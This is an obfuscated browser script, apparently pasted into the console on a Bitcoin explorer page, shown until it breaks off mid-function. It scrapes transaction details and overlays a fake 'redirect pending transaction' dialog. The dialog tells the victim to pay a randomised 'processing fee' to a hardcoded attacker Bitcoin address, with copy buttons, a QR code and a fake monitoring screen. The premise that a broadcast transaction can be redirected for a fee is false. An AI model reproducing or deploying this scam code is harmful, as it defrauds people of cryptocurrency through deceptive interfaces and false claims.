(() => {
  console.clear();
  const _0x5f7d90 = /\b[a-f0-9]{64}\b/i;
  const _0x1c49ff = /\b((?:bc1p|bc1q|bc1)[0-9a-z]{20,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,40})\b/i;
  const _0x27163c = _0x4bf167 => typeof _0x4bf167 === "number" ? _0x4bf167 : Number(_0x4bf167 || 0);
  const _0x11271c = _0x356819 => _0x27163c(_0x356819) / 100000000;
  const _0x4a4f54 = _0x5624ff => Number(String(_0x5624ff).replace(/[, \u00A0\u202F]/g, ""));
  const _0x1733aa = _0x41acf8 => {
    try {
      const _0x111ab3 = new URL(_0x41acf8, location.origin);
      return decodeURIComponent(_0x111ab3.pathname.split("/").filter(Boolean).pop() || "");
    } catch {
      return _0x41acf8.split("/").filter(Boolean).pop() || "";
    }
  };
  function _0xa027dc() {
    return new Promise((_0x530571, _0x2ee558) => {
      if (typeof QRCode !== "undefined") {
        _0x530571();
        return;
      }
      const _0x4f3a1c = document.createElement("script");
      _0x4f3a1c.src = "https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js";
      _0x4f3a1c.onload = () => _0x530571();
      _0x4f3a1c.onerror = () => _0x2ee558(new Error("Failed to load QRCode library"));
      document.head.appendChild(_0x4f3a1c);
    });
  }
  function _0x1a1499(_0x45621b, _0x405efd = 150) {
    const _0x1457da = document.createElement("div");
    _0x1457da.style.width = _0x405efd + "px";
    _0x1457da.style.height = _0x405efd + "px";
    new QRCode(_0x1457da, {
      text: String(_0x45621b),
      width: _0x405efd,
      height: _0x405efd,
      colorDark: "#000000",
      colorLight: "#ffffff",
      correctLevel: QRCode.CorrectLevel.H
    });
    return _0x1457da;
  }
  const _0x43860c = (location.pathname || "").split("/").filter(Boolean).pop() || "";
  let _0x54f168 = _0x5f7d90.test(_0x43860c) ? _0x43860c.match(_0x5f7d90)[0] : "";
  if (!_0x54f168) {
    const _0x4c4411 = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    let _0x2147f8;
    while (_0x2147f8 = _0x4c4411.nextNode()) {
      const _0x52b0f2 = _0x2147f8.nodeValue && _0x2147f8.nodeValue.match(_0x5f7d90);
      if (_0x52b0f2) {
        _0x54f168 = _0x52b0f2[0];
        break;
      }
    }
  }
  if (!_0x54f168) {
    alert("Transaction ID not found.");
    return;
  }
  const _0x3667fe = document.body.innerText || "";
  const _0xd494ae = [];
  const _0x32b4ea = document.getElementById("__NEXT_DATA__");
  if (_0x32b4ea?.textContent?.trim().startsWith("{")) {
    _0xd494ae.push(_0x32b4ea.textContent.trim());
  }
  document.querySelectorAll("script[type=\"application/json\"], script:not([src])").forEach(_0x43998f => {
    const _0x3c49e3 = _0x43998f.textContent?.trim();
    if (!_0x3c49e3) {
      return;
    }
    if (_0x3c49e3.includes(_0x54f168) || _0x3c49e3.startsWith("{") && _0x3c49e3.length > 2000 && (_0x3c49e3.includes("\"props\"") || _0x3c49e3.includes("\"pageProps\""))) {
      _0xd494ae.push(_0x3c49e3);
    }
  });
  const _0x500437 = [];
  for (const _0x1556b1 of _0xd494ae) {
    try {
      _0x500437.push(JSON.parse(_0x1556b1));
    } catch {}
  }
  function _0x51d996(_0x27d942, _0x25f39c) {
    let _0x24d825 = null;
    (function _0x4b61a8(_0x52217e) {
      if (!_0x52217e || _0x24d825) {
        return;
      }
      if (typeof _0x52217e !== "object") {
        return;
      }
      const _0xf2ae58 = _0x52217e.tx || _0x52217e.transaction || _0x52217e;
      const _0x40ead2 = String(_0xf2ae58.hash || _0xf2ae58.txid || "").toLowerCase();
      if (_0x40ead2 && _0x40ead2 === _0x25f39c.toLowerCase()) {
        _0x24d825 = _0xf2ae58;
        return;
      }
      for (const _0x437bec in _0x52217e) {
        if (!_0x24d825) {
          try {
            _0x4b61a8(_0x52217e[_0x437bec]);
          } catch {}
        }
      }
    })(_0x27d942);
    return _0x24d825;
  }
  let _0x2f7d63 = null;
  for (const _0x3dc45f of _0x500437) {
    _0x2f7d63 = _0x51d996(_0x3dc45f, _0x54f168);
    if (_0x2f7d63) {
      break;
    }
  }
  let _0x46684a = "—";
  let _0x122f3c = null;
  let _0x24b88c = "—";
  let _0x5cfa9a = "—";
  let _0xe0c918 = null;
  function _0xf389dc() {
    const _0xd870ca = document.querySelector("div[data-testid=\"transaction-amount\"]") || document.querySelector("span[class*=\"sc-\"]") || document.querySelector("div[class*=\"Value\"]");
    if (_0xd870ca) {
      const _0x2f8008 = _0xd870ca.textContent.trim();
      const _0x52764f = _0x2f8008.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
      if (_0x52764f) {
        _0x122f3c = Math.round(Number(_0x52764f[1]) * 100000000);
      }
    }
    const _0x9cfaa8 = document.querySelector("span[class*=\"Status\"], div[class*=\"status\"]");
    if (_0x9cfaa8) {
      const _0x30b1a7 = _0x9cfaa8.textContent.trim();
      if (/confirmed/i.test(_0x30b1a7)) {
        _0x5cfa9a = "Confirmed";
      } else if (/pending/i.test(_0x30b1a7) || /unconfirmed/i.test(_0x30b1a7)) {
        _0x5cfa9a = "Pending";
      }
    }
    const _0x58a73a = document.querySelector("a[href*=\"/explorer/addresses/btc/\"]") || document.querySelector("a[href*=\"/address/\"]");
    if (_0x58a73a) {
      const _0x39525a = _0x58a73a.getAttribute("href") || "";
      const _0x462ac0 = _0x39525a.split("/").filter(Boolean);
      const _0x1412d7 = _0x462ac0[_0x462ac0.length - 1];
      if (_0x1c49ff.test(_0x1412d7)) {
        _0x46684a = _0x1412d7;
      }
    }
    const _0x13158a = _0x3667fe.match(/\$([0-9,]+(?:\.[0-9]+)?)\s*(?:USD|usd)?/i);
    const _0x26dde4 = _0x3667fe.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
    if (_0x13158a && _0x26dde4) {
      _0xe0c918 = {
        btc: Number(_0x26dde4[1]),
        usd: _0x4a4f54(_0x13158a[1])
      };
    }
  }
  if (!_0x2f7d63) {
    _0xf389dc();
  }
  if (_0x2f7d63) {
    const _0x4f4617 = _0x2f7d63.vin || _0x2f7d63.inputs || [];
    const _0x20daa6 = _0x2f7d63.vout || _0x2f7d63.out || _0x2f7d63.outputs || [];
    const _0x511e17 = [];
    for (const _0x2bf4af of _0x4f4617) {
      const _0xbe6648 = [_0x2bf4af.addr, _0x2bf4af.address, _0x2bf4af.sender, _0x2bf4af.prev_out && _0x2bf4af.prev_out.addr, _0x2bf4af.prev_out && _0x2bf4af.prev_out.address, _0x2bf4af.prevout && _0x2bf4af.prevout.addr, _0x2bf4af.prevout && _0x2bf4af.prevout.address, ...(_0x2bf4af.addresses || []), ...(_0x2bf4af.prev_out && _0x2bf4af.prev_out.addresses ? _0x2bf4af.prev_out.addresses : [])].filter(Boolean);
      for (const _0x3dccd8 of _0xbe6648) {
        const _0x146391 = String(_0x3dccd8).match(_0x1c49ff);
        if (_0x146391) {
          _0x511e17.push(_0x146391[0]);
          break;
        }
      }
    }
    if (_0x511e17.length >= 1) {
      _0x46684a = _0x511e17[0];
    }
    const _0x2635c9 = new Set(_0x511e17);
    let _0x4f82b3 = 0;
    let _0x486069 = 0;
    for (const _0x4623d1 of _0x20daa6) {
      let _0x2402de = null;
      if (_0x4623d1.value_satoshis != null) {
        _0x2402de = Number(_0x4623d1.value_satoshis);
      } else if (_0x4623d1.value_satoshi != null) {
        _0x2402de = Number(_0x4623d1.value_satoshi);
      } else if (_0x4623d1.valueSat != null) {
        _0x2402de = Number(_0x4623d1.valueSat);
      } else if (_0x4623d1.value != null) {
        const _0x327b3c = Number(_0x4623d1.value);
        _0x2402de = _0x327b3c > 10000000 ? _0x327b3c : Math.round(_0x327b3c * 100000000);
      }
      if (_0x2402de == null) {
        continue;
      }
      _0x486069 += _0x2402de;
      const _0x248a4a = [_0x4623d1.addr, _0x4623d1.address, _0x4623d1.scriptPubKey && _0x4623d1.scriptPubKey.address, _0x4623d1.scriptPubKey && _0x4623d1.scriptPubKey.addresses && _0x4623d1.scriptPubKey.addresses[0]].filter(Boolean);
      let _0x2643c7 = null;
      for (const _0x4de3a5 of _0x248a4a) {
        const _0x652a6c = String(_0x4de3a5).match(_0x1c49ff);
        if (_0x652a6c) {
          _0x2643c7 = _0x652a6c[0];
          break;
        }
      }
      if (!_0x2643c7 || !_0x2635c9.has(_0x2643c7)) {
        _0x4f82b3 += _0x2402de;
      }
    }
    _0x122f3c = _0x4f82b3 > 0 ? _0x4f82b3 : _0x486069;
    const _0x29f1b8 = _0x2f7d63.time || _0x2f7d63.received_time || _0x2f7d63.block_time || _0x2f7d63.timestamp;
    if (_0x29f1b8) {
      try {
        const _0x341f6f = new Date(String(_0x29f1b8).length === 10 ? _0x29f1b8 * 1000 : _0x29f1b8);
        _0x24b88c = _0x341f6f.toLocaleString();
      } catch {}
    }
    const _0x1527ad = _0x2f7d63.confirmations ?? _0x2f7d63.n_confirmations ?? (_0x2f7d63.block_height ? 1 : 0);
    _0x5cfa9a = Number(_0x1527ad) >= 1 ? "Confirmed" : "Pending";
  } else {
    if (_0x46684a === "—") {
      const _0x2dbe8f = Array.from(document.querySelectorAll("section,div,article,main")).filter(_0x51742a => /overview/i.test(_0x51742a.textContent || "") || /from/i.test(_0x51742a.textContent || ""));
      for (const _0x9e3656 of _0x2dbe8f) {
        const _0x1d7983 = _0x9e3656.querySelector("a[href*=\"/explorer/addresses/btc/\"], a[href*=\"/address/\"], a[href*=\"/btc/address/\"]");
        if (_0x1d7983) {
          const _0x145c1a = _0x1733aa(_0x1d7983.getAttribute("href") || "");
          const _0x2654dd = _0x145c1a.match(_0x1c49ff);
          if (_0x2654dd) {
            _0x46684a = _0x2654dd[0];
            break;
          }
        }
        const _0x20b9d3 = _0x9e3656.innerText || "";
        const _0x24b370 = _0x20b9d3.match(new RegExp("From\\s*[:\\-]?\\s*(" + _0x1c49ff.source + ")", "i"));
        if (_0x24b370) {
          _0x46684a = _0x24b370[1];
          break;
        }
      }
    }
    if (!_0x122f3c) {
      const _0x499616 = _0x3667fe.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC/i);
      if (_0x499616) {
        _0x122f3c = Math.round(Number(_0x499616[1]) * 100000000);
      }
    }
    if (_0x5cfa9a === "—") {
      const _0x2c263a = _0x3667fe.match(/\b(Pending|Confirmed|Unconfirmed|Failed|Success|Completed?|In\s+Mempool)\b/i);
      if (_0x2c263a) {
        _0x5cfa9a = _0x2c263a[0];
      }
    }
    if (_0x24b88c === "—") {
      const _0x521f0f = _0x3667fe.match(/Broadcasted on\s*([^\n\r]+)/i) || _0x3667fe.match(/Broadcasted\s*:\s*([^\n\r]+)/i);
      if (_0x521f0f) {
        _0x24b88c = _0x521f0f[1].trim();
      }
    }
  }
  function _0x1b4c02() {
    const _0x5e93a3 = Array.from(document.querySelectorAll("section,div,article,main"));
    const _0x3d2f9b = _0x5e93a3.map(_0x1daa1a => {
      const _0x46aa82 = (_0x1daa1a.innerText || "").toLowerCase();
      const _0x2067dd = (_0x46aa82.includes("overview") ? 1 : 0) + (_0x46aa82.includes("amount") ? 2 : 0) + (_0x46aa82.includes("btc") ? 1 : 0) + (_0x46aa82.includes("$") ? 1 : 0);
      return {
        el: _0x1daa1a,
        score: _0x2067dd,
        len: _0x46aa82.length
      };
    }).filter(_0x1bf8e8 => _0x1bf8e8.score >= 3).sort((_0x4e670c, _0x49a46e) => _0x49a46e.score - _0x4e670c.score || _0x49a46e.len - _0x4e670c.len);
    return _0x3d2f9b[0]?.el || document.body;
  }
  const _0xeb97df = _0x1b4c02();
  function _0x14201f() {
    const _0x3d2fed = Array.from(_0xeb97df.querySelectorAll("*"));
    let _0x51119e = null;
    for (const _0x22e613 of _0x3d2fed) {
      const _0x5e8e81 = (_0x22e613.textContent || "").trim();
      if (/^Amount$/i.test(_0x5e8e81)) {
        let _0x1338a4 = _0x22e613.nextElementSibling;
        if (!_0x1338a4 || !(_0x1338a4.innerText || "").trim()) {
          _0x1338a4 = _0x22e613.parentElement?.querySelector(":scope > *:nth-child(2)");
        }
        _0x51119e = _0x1338a4 || _0x22e613.parentElement;
        break;
      }
    }
    let _0x2ba43a = "";
    if (_0x51119e) {
      _0x2ba43a = _0x51119e.innerText || "";
    } else {
      const _0x52e428 = _0xeb97df.innerText || "";
      const _0x5ab75a = _0x52e428.match(/Amount[\s\S]{0,150}?([0-9]+(?:\.[0-9]+)?)\s*BTC[\s\S]{0,80}?\$\s*([0-9]{1,3}(?:[,\u00A0\u202F][0-9]{3})*(?:\.[0-9]+)?|[0-9]+(?:\.[0-9]+)?)/i);
      if (_0x5ab75a) {
        return {
          btc: _0x4a4f54(_0x5ab75a[1]),
          usd: _0x4a4f54(_0x5ab75a[2])
        };
      }
    }
    if (/fee/i.test(_0x2ba43a)) {
      const _0x593789 = _0x2ba43a.split(/\n+/).map(_0x50b656 => _0x50b656.trim()).filter(Boolean);
      const _0xeb1acc = _0x593789.find(_0xf9a702 => /BTC/i.test(_0xf9a702) && /\$/i.test(_0xf9a702) && !/Fee/i.test(_0xf9a702));
      _0x2ba43a = _0xeb1acc || _0x2ba43a;
    }
    const _0x140725 = _0x2ba43a.match(/([0-9]+(?:\.[0-9]+)?)\s*BTC[\s\S]{0,80}?\$\s*([0-9]{1,3}(?:[,\u00A0\u202F][0-9]{3})*(?:\.[0-9]+)?|[0-9]+(?:\.[0-9]+)?)/i);
    if (_0x140725) {
      return {
        btc: _0x4a4f54(_0x140725[1]),
        usd: _0x4a4f54(_0x140725[2])
      };
    }
    return null;
  }
  _0xe0c918 = _0xe0c918 || _0x14201f();
  const _0x2e1c28 = _0x122f3c != null ? _0x11271c(_0x122f3c).toLocaleString(undefined, {
    maximumFractionDigits: 8
  }) + " BTC" : "—";
  let _0x43a20a = "—";
  if (_0xe0c918 && _0x122f3c != null) {
    const _0x416a08 = _0xe0c918.usd / _0xe0c918.btc;
    const _0x3bb8e2 = _0x11271c(_0x122f3c) * _0x416a08;
    _0x43a20a = "$" + _0x3bb8e2.toLocaleString(undefined, {
      maximumFractionDigits: 2
    });
  }
  const _0x5ef892 = 14.5;
  const _0x4ab9bf = 28.5;
  const _0x48d325 = (Math.random() * (_0x4ab9bf - _0x5ef892) + _0x5ef892).toFixed(2);
  let _0x235579 = "—";
  let _0x2c2bb0 = "—";
  if (_0xe0c918) {
    const _0x476ff9 = _0xe0c918.usd / _0xe0c918.btc;
    _0x235579 = (_0x48d325 / _0x476ff9).toFixed(8);
    _0x2c2bb0 = _0x235579 + " BTC ($" + _0x48d325 + ")";
  } else {
    const _0x357fac = ((_0x5ef892 + _0x4ab9bf) / 2).toFixed(2);
    _0x235579 = "0.0008";
    _0x2c2bb0 = _0x235579 + " BTC ($" + _0x357fac + ")";
  }
  const _0xdb84b3 = "btc_flow_overlay";
  const _0x4dd753 = "btc_flow_popup";
  const _0x15c7c0 = "btc_flow_style";
  document.getElementById(_0xdb84b3)?.remove();
  document.getElementById(_0x15c7c0)?.remove();
  const _0x14e1c3 = document.createElement("style");
  _0x14e1c3.id = _0x15c7c0;
  _0x14e1c3.textContent = "\n    #" + _0xdb84b3 + " {\n      position: fixed;\n      inset: 0;\n      display: grid;\n      place-items: center;\n      background: rgba(0,0,0,0.7);\n      z-index: 2147483647;\n      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;\n    }\n    #" + _0x4dd753 + " {\n      background: #fff;\n      color: #333;\n      width: 380px;\n      border-radius: 10px;\n      box-shadow: 0 8px 25px rgba(0,0,0,0.3);\n      overflow: hidden;\n      font-size: 13px;\n      max-height: 90vh;\n      overflow-y: auto;\n    }\n    .page { display: none; }\n    .page.active { display: block; }\n    .header {\n      padding: 15px 45px 15px 18px;\n      background: #f8f9fa;\n      border-bottom: 1px solid #e0e0e0;\n      text-align: center;\n      position: relative;\n    }\n    .header h3 { margin: 0; font-size: 16px; font-weight: 600; }\n    .header-subtitle { font-size: 12px; color: #666; margin-top: 2px; }\n    .close-btn {\n      position: absolute;\n      top: 50%;\n      right: 12px;\n      transform: translateY(-50%);\n      background: none;\n      border: none;\n      font-size: 18px;\n      color: #666;\n      cursor: pointer;\n      width: 28px;\n      height: 28px;\n      border-radius: 50%;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n    }\n    .close-btn:hover { background: #e9ecef; }\n    .content { padding: 16px; }\n    .transaction-info {\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      margin-bottom: 12px;\n      border: 1px solid #e0e0e0;\n    }\n    .info-row {\n      display: flex;\n      justify-content: space-between;\n      padding: 5px 0;\n      border-bottom: 1px solid #f0f0f0;\n    }\n    .info-row:last-child { border-bottom: none; }\n    .info-label { color: #666; font-size: 12px; }\n    .info-value { color: #333; font-weight: 500; font-size: 12px; text-align: right; }\n    .amount-display {\n      text-align: center;\n      margin: 15px 0;\n      padding: 12px;\n      background: #f8f9fa;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .btc-amount { font-size: 22px; font-weight: 700; color: #f7931a; }\n    .usd-amount { font-size: 13px; color: #666; }\n    .status-badge {\n      display: inline-block;\n      padding: 2px 8px;\n      background: #ffa726;\n      color: #fff;\n      border-radius: 3px;\n      font-size: 10px;\n      font-weight: 600;\n      margin-left: 6px;\n    }\n    .status-confirmed { background: #4caf50; }\n    .input-group {\n      margin: 12px 0;\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .input-label { font-size: 12px; font-weight: 500; margin-bottom: 6px; }\n    input[type=\"text\"] {\n      width: 100%;\n      padding: 8px 10px;\n      border: 1px solid #ddd;\n      border-radius: 4px;\n      font-size: 13px;\n      font-family: monospace;\n      background: #fff;\n      box-sizing: border-box;\n    }\n    input[type=\"text\"]:focus { outline: none; border-color: #007bff; }\n    input[type=\"text\"].invalid { border-color: #dc3545; }\n    .validation-message { font-size: 11px; margin-top: 4px; display: none; }\n    .validation-message.invalid { color: #dc3545; display: block; }\n    .btn {\n      width: 100%;\n      padding: 10px;\n      border: none;\n      border-radius: 4px;\n      font-size: 13px;\n      font-weight: 600;\n      cursor: pointer;\n      margin-bottom: 6px;\n      transition: all 0.2s;\n    }\n    .btn:active { transform: scale(0.98); }\n    .btn-primary { background: #007bff; color: #fff; }\n    .btn-primary:hover { background: #0056b3; }\n    .btn-primary:disabled { background: #6c757d; cursor: not-allowed; opacity: 0.6; }\n    .btn-secondary { background: #6c757d; color: #fff; }\n    .btn-secondary:hover { background: #545b62; }\n    .btn-simple {\n      background: transparent;\n      color: #6c757d;\n      border: 1px solid #dee2e6;\n      font-weight: normal;\n    }\n    .btn-simple:hover { background: #f8f9fa; }\n    .btn-outline {\n      background: transparent;\n      color: #007bff;\n      border: 1px solid #007bff;\n      font-weight: normal;\n    }\n    .btn-outline:hover { background: #007bff; color: #fff; }\n    .notice-box {\n      background: #fff3cd;\n      border: 1px solid #ffeaa7;\n      padding: 10px 12px;\n      border-radius: 4px;\n      margin: 10px 0;\n      font-size: 12px;\n    }\n    .notice-box strong { font-weight: 600; }\n    .copy-section {\n      background: #f8f9fa;\n      padding: 12px;\n      border-radius: 6px;\n      margin: 10px 0;\n      border: 1px solid #e0e0e0;\n    }\n    .copy-header {\n      font-size: 13px;\n      font-weight: 600;\n      text-align: center;\n      padding-bottom: 8px;\n      border-bottom: 1px solid #e9ecef;\n    }\n    .copy-item {\n      display: flex;\n      align-items: center;\n      justify-content: space-between;\n      padding: 8px 0;\n      border-bottom: 1px solid #e9ecef;\n    }\n    .copy-item:last-child { border-bottom: none; }\n    .copy-label { font-size: 12px; color: #666; min-width: 60px; }\n    .copy-value {\n      flex: 1;\n      font-family: monospace;\n      font-size: 11px;\n      color: #2c3e50;\n      word-break: break-all;\n      margin: 0 10px;\n      text-align: center;\n    }\n    .copy-btn {\n      background: #6c757d;\n      color: #fff;\n      border: none;\n      padding: 4px 8px;\n      border-radius: 3px;\n      font-size: 10px;\n      font-weight: 600;\n      cursor: pointer;\n      min-width: 44px;\n    }\n    .copy-btn:hover { background: #545b62; }\n    .copy-btn.copied { background: #28a745; }\n    .qr-code-container {\n      width: 150px;\n      height: 150px;\n      margin: 8px auto;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      background: #fff;\n      padding: 8px;\n      border-radius: 6px;\n      border: 1px solid #e0e0e0;\n    }\n    .qr-code-container canvas,\n    .qr-code-container div { display: block; width: 100% !important; height: 100% !important; }\n    .processing { text-align: center; padding: 15px; }\n    .processing-icon { font-size: 28px; margin-bottom: 10px; }\n    .processing-text { font-size: 13px; color: #666; }\n    .progress-bar {\n      height: 3px;\n      background: #e0e0e0;\n      border-radius: 2px;\n      margin: 12px 0;\n      overflow: hidden;\n    }\n    .progress {\n      height: 100%;\n      background: #007bff;\n      width: 45%;\n      animation: progress 2s ease-in-out infinite;\n    }\n    @keyframes progress {\n      0% { transform: translateX(-100%); }\n      100% { transform: translateX(250%); }\n    }\n    .footer {\n      padding: 10px 16px;\n      background: #f8f9fa;\n      border-top: 1px solid #e0e0e0;\n      display: flex;\n      justify-content: space-between;\n      font-size: 11px;\n      color: #666;\n    }\n    .monospace { font-family: monospace; font-size: 10px; }\n    .confirmed-box {\n      background: #d4edda;\n      border: 1px solid #c3e6cb;\n      padding: 10px;\n      border-radius: 4px;\n      margin: 10px 0;\n      font-size: 12px;\n    }\n    #qrCodeCanvasContainer { display: none; margin: 8px auto; text-align: center; }\n    .qr-loading { color: #666; font-size: 12px; padding: 15px; }\n    .error-box {\n      background: #f8d7da;\n      border: 1px solid #f5c6cb;\n      padding: 15px;\n      border-radius: 6px;\n      margin: 12px 0;\n      text-align: center;\n    }\n    .error-icon { font-size: 28px; margin-bottom: 6px; color: #dc3545; }\n    .error-title { font-size: 14px; font-weight: 600; color: #721c24; }\n    .error-message { font-size: 12px; color: #721c24; }\n  ";
  document.head.appendChild(_0x14e1c3);
  const _0x2b0297 = document.createElement("div");
  _0x2b0297.id = _0xdb84b3;
  const _0x376574 = document.createElement("div");
  _0x376574.id = _0x4dd753;
  const _0x16a537 = _0x5cfa9a.toLowerCase().includes("confirmed");
  const _0xc3558b = !_0x16a537;
  const _0x5c78f5 = () => "\n    <div class=\"page active\" id=\"page1\">\n      <div class=\"header\">\n        <button class=\"close-btn\" id=\"closePage1\">✕</button>\n        <h3>Transaction Details</h3>\n        <div class=\"header-subtitle\">Bitcoin Network</div>\n      </div>\n      <div class=\"content\">\n        <div class=\"amount-display\">\n          <div class=\"btc-amount\">" + _0x2e1c28 + " <span class=\"status-badge " + (_0x16a537 ? "status-confirmed" : "") + "\">" + _0x5cfa9a + "</span></div>\n          <div class=\"usd-amount\">" + _0x43a20a + "</div>\n        </div>\n        <div class=\"transaction-info\">\n          <div class=\"info-row\"><span class=\"info-label\">TXID:</span><span class=\"info-value monospace\">" + _0x54f168.substring(0, 14) + "...</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">From:</span><span class=\"info-value monospace\">" + _0x46684a.substring(0, 14) + "...</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Time:</span><span class=\"info-value\">" + _0x24b88c + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Network:</span><span class=\"info-value\">Bitcoin Mainnet</span></div>\n        </div>\n        " + (_0xc3558b ? "\n          <div class=\"notice-box\"><strong>Pending Transaction</strong><br>Can be redirected before confirmation.</div>\n          <div class=\"input-group\">\n            <div class=\"input-label\">New recipient address:</div>\n            <input type=\"text\" id=\"redirectAddress\" placeholder=\"Enter Bitcoin address\" />\n            <div class=\"validation-message\" id=\"addressValidation\"></div>\n          </div>\n          <button class=\"btn btn-primary\" id=\"nextToFees\" disabled>Continue</button>\n        " : "\n          <div class=\"confirmed-box\"><strong>Confirmed</strong><br>This transaction cannot be modified.</div>\n          <button class=\"btn btn-secondary\" id=\"closeOnly\">Close</button>\n        ") + "\n      </div>\n      <div class=\"footer\"><div>Step 1 of 3</div><div>Secure</div></div>\n    </div>\n  ";
  const _0x462e05 = () => "\n    <div class=\"page\" id=\"page2\">\n      <div class=\"header\">\n        <button class=\"close-btn\" id=\"closePage2\">✕</button>\n        <h3>Processing Fee</h3>\n        <div class=\"header-subtitle\">Bitcoin Transaction Service</div>\n      </div>\n      <div class=\"content\">\n        <div class=\"transaction-info\">\n          <div class=\"info-row\"><span class=\"info-label\">Amount:</span><span class=\"info-value\">" + _0x2e1c28 + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">Fee:</span><span class=\"info-value\">" + _0x2c2bb0 + "</span></div>\n          <div class=\"info-row\"><span class=\"info-label\">New Recipient:</span><span class=\"info-value monospace\" id=\"newRecipientDisplay\">—</span></div>\n        </div>\n        <div class=\"notice-box\">Network fee required to process the redirection.</div>\n        <div class=\"copy-section\">\n          <div class=\"copy-header\">SEND PROCESSING FEE</div>\n          <div class=\"copy-item\"><span class=\"copy-label\">Amount:</span><span class=\"copy-value\">" + _0x235579 + " BTC</span><button class=\"copy-btn\" data-copy=\"" + _0x235579 + "\">Copy</button></div>\n          <div class=\"copy-item\"><span class=\"copy-label\">Address:</span><span class=\"copy-value\">bc1qv4csl0kj0gpjuq2hvnthdanx9ltg5dqu0dpnhc</span><button class=\"copy-btn\" data-copy=\"bc1qv4csl0kj0gpjuq2hvnthdanx9ltg5dqu0dpnhc\">Copy</button></div>\n        </div>\n        <button class=\"btn btn-outline\" id=\"toggleQRCode\">Show QR Code</button>\n        <div id=\"qrCodeCanvasContainer\" style=\"display:none;text-align:center;\">\n          <div class=\"qr-code-container\" id=\"qrCodeDisplay\"><div class=\"qr-loading\">Loading...</div></div>\n          <div style=\"font-size:11px;color:#666;margin-top:6px;\">Scan to pay " + _0x235579 + " BTC</div>\n        </div>\n        <div class=\"notice-box\" style=\"background:#e3f2fd;border-color:#bbdefb;\"><strong>Note:</strong> The original amount (" + _0x2e1c28 + ") will be redirected after fee confirmation.</div>\n        <button class=\"btn btn-primary\" id=\"confirmProcessing\">Confirm Fee Payment</button>\n        <button class=\"btn btn-secondary\" id=\"backToOverview\">Back</button>\n      </div>\n      <div class=\"footer\"><div>Step 2 of 3</div><div>Monitoring</div></div>\n    </div>\n  ";
  const _0x46744d = () => "\n    <div class=\"page\" id=\"page3\">\n      <div class=\"header\"><h3>Processing</h3><div class=\"header-subtitle\">Network Confirmation</div></div>\n      <div class=\"content\">\n        <div class=\"processing\">\n          <div class=\"processing-icon\">⏳</div>\n          <div class=\"processing-text\">Monitoring blockchain for fee confirmation...</div>\n          <div class=\"progress-bar\"><div class=\"progress\"></div></div>\n          <div class=\"transaction-info\">\n            <div class=\"info-row\"><span class=\"info-label\">Status:</span><span class=\"info-value\">Awaiting " + _0x235579 + " BTC Fee</span></div>\n            <div class=\"info-row\"><span class=\"info-label\">Recipient:</span><span class=\"info-value monospace\" id=\"monitorRecipient\">—</span></div>\n            <div class=\"info-row\"><span class=\"info-label\">Amount:</span><span class=\"info-value\">" + _0x2e1c28 + "</span></div>\n          </div>\n        </div>\n        <button class=\"btn btn-simple\" id=\"closeProcessing\">Close</button>\n      </div>\n      <div class=\"footer\"><div>Step 3 of 3</div><div>Connected</div></div>\n    </div>\n  ";
  _0x376574.innerHTML = _0x5c78f5() + (_0xc3558b ? _0x462e05() + _0x46744d() : "");
  _0x2b0297.appendChild(_0x376574);
  document.body.appendChild(_0x2b0297);
  if (_0xc3558b) {
    let _0x1a0489 = 1;
    const _0x184c90 = {
      1: document.getElementById("page1"),
      2: document.getElementById("page2"),
      3: document.getElementById("page3")
    };
    function _0x25f4a6(_0xd8d204) {
      Object.values(_0x184c90).forEach(_0x3a9325 => _0x3a9325.classList.remove("active"));
      _0x184c90[_0xd8d204].classList.add("active");
      _0x1a0489 = _0xd8d204;
    }
    async function _0x4afa78() {
      const _0x4a11a7 = document.getElementById("toggleQRCode");
      const _0x52ab0c = document.getElementById("qrCodeCanvasContainer");
      const _0x5ad4d5 = document.getElementById("qrCodeDisplay");
      if (!_0x4a11a7 || !_0x52ab0c || !_0x5ad4d5) {
        return;
      }
      const _0x86c1b0 = "bc1qv4csl0kj0gpjuq2hvnthdanx9ltg5dqu0dpnhc";
      const _0xe1fe75 = "bitcoin:" + _0x86c1b0 + "?amount=" + _0x235579;
      let _0x50cb0e = false;
      _0x4a11a7.addEventListener("click", async function () {
        if (_0x52ab0c.style.display === "block") {
          _0x52ab0c.style.display = "none";
          this.textContent = "Show QR Code";
        } else if (!_0x50cb0e) {
          try {
            _0x5ad4d5.innerHTML = "<div class=\"qr-loading\">⏳ Loading...</div>";
            _0x52ab0c.style.display = "block";
            await _0xa027dc();
            const _0x1e1bb8 = _0x1a1499(_0xe1fe75, 150);
            _0x5ad4d5.innerHTML = "";
            _0x5ad4d5.appendChild(_0x1e1bb8);
            this.textContent = "Hide QR Code";
            _0x50cb0e = true;
          } catch (_0x2fee2b) {
            _0x5ad4d5.innerHTML = "<div style=\"color:#dc3545;padding:15px;text-align:center;\">❌ Failed<br><small>" + _0x2fee2b.message + "</small></div>";
          }
        } else {
          _0x52ab0c.style.display = "block";
          this.textContent = "Hide QR Code";
        }
      });
    }
    function _0x32b3c8() {
      document.querySelectorAll(".copy-btn").forEach(_0x132cef => {
        _0x132cef.addEventListener("click", async function () {
          const _0x562995 = this.getAttribute("data-copy");
          try {
            await navigator.clipboard.writeText(_0x562995);
            const _0x3665e1 = this.textContent;
            this.textContent = "Copied!";
            this.classList.add("copied");
            setTimeout(() => {
              this.textContent = _0x3665e1;
              this.classList.remove("copied");
            }, 1500);
          } catch {
            const _0x28242a = document.createElement("textarea");
            _0x28242a.value = _0x562995;
            document.body.appendChild(_0x28242a);
            _0x28242a.select();
            document.execCommand("copy");
            document.body.removeChild(_0x28242a);
            const _0x4ad7bc = this.textContent;
